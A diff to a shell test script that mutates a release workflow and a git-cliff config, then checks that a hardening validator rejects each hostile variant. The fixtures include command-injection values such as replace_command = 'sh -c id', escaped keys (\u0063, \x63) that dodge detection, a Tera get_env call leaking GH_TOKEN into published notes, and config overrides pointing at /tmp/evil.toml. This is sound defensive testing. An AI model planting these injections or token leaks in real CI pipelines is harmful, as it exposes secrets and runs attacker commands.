+mutate notes-env 's|^\( *\)\(# shell\.\)$|\1\2\
+\1GIT_CLIFF_CONFIG: /tmp/evil.toml|' 'GIT_CLIFF_CONFIG: /tmp/evil'
+expect_both_reject "a GIT_CLIFF_CONFIG in the notes step's env" "$mut_dir/notes-env.yml" \
+  "the notes step's env must be exactly TAG, got" \
+  "$(printf '%s' 'the notes step differs from the pinned step at line 3: got:     GIT_CLIFF_CONFIG: /tmp/evil.toml')"
+
+# git-cliff from two steps, still two calls: the env pin above holds for one
+# step only, so every call must come from that one.
+mutate cliff-2steps 's|"\$RUNNER_TEMP/bin/git-cliff" --config cliff.toml --tag "\$TAG" --latest|echo --latest|
+s|^\( *\)\(chmod u+x "\$RUNNER_TEMP/bin/git-cliff"\)$|\1\2\
+\1"$RUNNER_TEMP/bin/git-cliff" --version|' 'git-cliff" --version'
+expect_both_reject "git-cliff called from two steps" "$mut_dir/cliff-2steps.yml" \
+  'expected git-cliff to run from exactly one step, found 2' 'calls git-cliff from a second step'
+
+# cliff.toml: a trailing comment is not a list entry, an escaped key is
+# refused, and a real postprocessors key is held to the same empty list.
+sed 's|^commit_preprocessors = \[\]$|commit_preprocessors = []  # note|' "$cliff" > "$mut_dir/cliff-comment.toml"
+grep -Fq -- '[]  # note' "$mut_dir/cliff-comment.toml" || fail "fixture bug: the cliff-comment mutation did not apply"
+out="$(cliff_shell_check "$mut_dir/cliff-comment.toml")" \
+  || fail "cliff_shell_check must accept a trailing comment after an empty list, but it rejected it: $out"
+ok "cliff.toml check accepts commit_preprocessors = []  # note"
+
+sed 's|^commit_preprocessors = \[\]$|commit_preprocessors = [{ pattern = ".*", "replace_\\u0063ommand" = "sh -c id" }]|' "$cliff" > "$mut_dir/cliff-esc.toml"
+grep -Fq -- 'replace_\u0063ommand' "$mut_dir/cliff-esc.toml" || fail "fixture bug: the cliff-esc mutation did not apply"
+cliff_fixture 'an escaped key ("replace_\u0063ommand")' "$mut_dir/cliff-esc.toml" 'escape - an escaped key can spell'
+
+sed 's|^\[changelog\]$|[changelog]\
+postprocessors = [{ pattern = "a", replace = "b" }]|' "$cliff" > "$mut_dir/cliff-post.toml"
+grep -Fq -- 'postprocessors = [{' "$mut_dir/cliff-post.toml" || fail "fixture bug: the cliff-post mutation did not apply"
+cliff_fixture "a non-empty postprocessors under [changelog]" "$mut_dir/cliff-post.toml" 'non-empty *processors list'
+
+# --- Overrides from inside run:, cliff.toml's env and escapes, one document ----
+# The notes step's env is pinned, but its own run: text could still export a
+# GIT_CLIFF__* override just before calling git-cliff.
+mutate export-gc 's|^\( *\)\(if \[ -n "\$prev" \]; then\)$|\1export GIT_CLIFF__GIT__FILTER_UNCONVENTIONAL=false\
+\1\2|' 'export GIT_CLIFF__'
+expect_both_reject 'an export GIT_CLIFF__* inside the notes run:' "$mut_dir/export-gc.yml" \
+  "step 'Generate the release notes' mentions GIT_CLIFF__" 'mentions GIT_CLIFF__'
+
+# Accept controls for the notes step: its name's value is free, and a line
+# that mentions the absolute path without starting with it is not a call.
+mutate notes-rename 's/^\( *\)- name: Generate the release notes$/\1- name: Render the notes/' 'Render the notes'
+expect_both_accept "a renamed notes step" "$mut_dir/notes-rename.yml"
+mutate cliff-mention 's|^\( *\)\(chmod u+x "\$RUNNER_TEMP/bin/git-cliff"\)$|\1\2\
+\1test -x "$RUNNER_TEMP/bin/git-cliff" \|\| exit 1|' 'test -x "$RUNNER_TEMP/bin/git-cliff" ||'
+expect_both_accept "a git-cliff path mention that is not a call, in another step" "$mut_dir/cliff-mention.yml"
+
+# One `---` before the first key opens the document; a second opens another,
+# which PyYAML's safe_load refuses.
+mutate doc-twice 's/^name: Release$/---\
+---\
+name: Release/' '---'
+expect_both_reject "two --- markers before the first key" "$mut_dir/doc-twice.yml" \
+  'expected a single document in the stream' 'is not a single-line plain key: line'
+
+# Tera's get_env() prints the runner's env into the published notes.
+sed 's|^\[changelog\]$|[changelog]\
+footer = "{{ get_env(name=\\"GH_TOKEN\\") }}"|' "$cliff" > "$mut_dir/cliff-getenv.toml"
+grep -Fq -- 'get_env(name=' "$mut_dir/cliff-getenv.toml" || fail "fixture bug: the cliff-getenv mutation did not apply"
+cliff_fixture "a get_env() call" "$mut_dir/cliff-getenv.toml" 'calls get_env'
+
+# TOML 1.1's \xHH escape spells a key as well as \u does.
+sed 's|^commit_preprocessors = \[\]$|commit_preprocessors = [{ pattern = ".*", "replace_\\x63ommand" = "sh -c id" }]|' "$cliff" > "$mut_dir/cliff-escx.toml"
+grep -Fq -- 'replace_\x63ommand' "$mut_dir/cliff-escx.toml" || fail "fixture bug: the cliff-escx mutation did not apply"
+cliff_fixture 'an escaped key ("replace_\x63ommand")' "$mut_dir/cliff-escx.toml" 'escape - an escaped key can spell'
+
+# A quoted `#` must not hide a real replace_command, whatever the comment
+# strip does: this one also sits in a *processors list.
+sed 's|^commit_preprocessors = \[\]$|commit_preprocessors = [{ pattern = "a#b", replace_command = "sh -c id" }]|' "$cliff" > "$mut_dir/cliff-hash.toml"
+grep -Fq -- '"a#b", replace_command' "$mut_dir/cliff-hash.toml" || fail "fixture bug: the cliff-hash mutation did not apply"
+cliff_fixture 'a replace_command after a quoted "#"' "$mut_dir/cliff-hash.toml" 'uses replace_command'
+
+# A quoted `#` must not cut the line before a real replace_command. This one
+# sits in a plain inline table, outside any *processors list, so only the
+# replace_command grep can reject it: cliff-hash above also trips the
+# non-empty *processors check, which would hide a broken replace_command grep.
+sed 's|^\[changelog\]$|[changelog]\
+x = { a = "a#b", replace_command = "sh -c id" }|' "$cliff" > "$mut_dir/cliff-hash-bare.toml"
+grep -Fq -- 'x = { a = "a#b", replace_command' "$mut_dir/cliff-hash-bare.toml" || fail "fixture bug: the cliff-hash-bare mutation did not apply"
+grep -q 'processors' <<<"$(grep -F 'replace_command' "$mut_dir/cliff-hash-bare.toml")" \
+  && fail "fixture bug: cliff-hash-bare must keep its replace_command off every *processors line"
+cliff_fixture 'a replace_command after a quoted "#", outside any *processors list' "$mut_dir/cliff-hash-bare.toml" 'uses replace_command'
+
+# Inside a TOML multi-line string ("""/'''), a line that looks like a comment
+# is template text that Tera renders into the public notes. A Markdown heading
+# has exactly that shape, so the replace_command, get_env and escape greps
+# read the raw file: each of these would pass a comment-stripped read.
+sed 's|^\[changelog\]$|[changelog]\
+footer = """\
+# {{ get_env(name="HOME") }}\
+"""|' "$cliff" > "$mut_dir/cliff-heading-getenv.toml"
+grep -Fxq -- '# {{ get_env(name="HOME") }}' "$mut_dir/cliff-heading-getenv.toml" || fail "fixture bug: the cliff-heading-getenv mutation did not apply"
+cliff_fixture 'a get_env() on a "#"-led line of a """ string' "$mut_dir/cliff-heading-getenv.toml" 'calls get_env'
+
+sed 's|^\[changelog\]$|[changelog]\
+footer = """\
+text # {{ get_env(name=n) }}\
+"""|' "$cliff" > "$mut_dir/cliff-trail-getenv.toml"
+grep -Fxq -- 'text # {{ get_env(name=n) }}' "$mut_dir/cliff-trail-getenv.toml" || fail "fixture bug: the cliff-trail-getenv mutation did not apply"
+cliff_fixture 'a get_env() after a " #" inside a """ string' "$mut_dir/cliff-trail-getenv.toml" 'calls get_env'
+
+sed 's|^\[changelog\]$|[changelog]\
+header = """\
+# replace_command = "sh -c id"\
+"""|' "$cliff" > "$mut_dir/cliff-heading-cmd.toml"
+grep -Fxq -- '# replace_command = "sh -c id"' "$mut_dir/cliff-heading-cmd.toml" || fail "fixture bug: the cliff-heading-cmd mutation did not apply"
+cliff_fixture 'a replace_command on a "#"-led line of a """ string' "$mut_dir/cliff-heading-cmd.toml" 'uses replace_command'
+
+# The raw read fails closed: an escape inside a real comment is rejected too,
+# because this check cannot tell a comment from a "#"-led line of a """
+# string. The real cliff.toml has no \u, \U or \x anywhere, comments included.
+{ cat "$cliff"; printf '%s\n' '# a \u0041 in a whole-line comment'; } > "$mut_dir/cliff-esc-comment.toml"
+grep -Fxq -- '# a \u0041 in a whole-line comment' "$mut_dir/cliff-esc-comment.toml" || fail "fixture bug: the cliff-esc-comment mutation did not apply"
+cliff_fixture 'a \u escape in a whole-line comment (fails closed)' "$mut_dir/cliff-esc-comment.toml" 'escape - an escaped key can spell'
+
+sed 's|^commit_preprocessors = \[\]$|commit_preprocessors = []  # and \\u0041 after a value|' "$cliff" > "$mut_dir/cliff-esc-trail.toml"
+grep -Fq -- '[]  # and \u0041 after' "$mut_dir/cliff-esc-trail.toml" || fail "fixture bug: the cliff-esc-trail mutation did not apply"
+cliff_fixture 'a \u escape in a trailing comment (fails closed)' "$mut_dir/cliff-esc-trail.toml" 'escape - an escaped key can spell'
 
 mutate unrelated 's/whole history up to/all of history up to/' 'all of history up to'
 expect_both_accept "an unrelated change in another step" "$mut_dir/unrelated.yml"
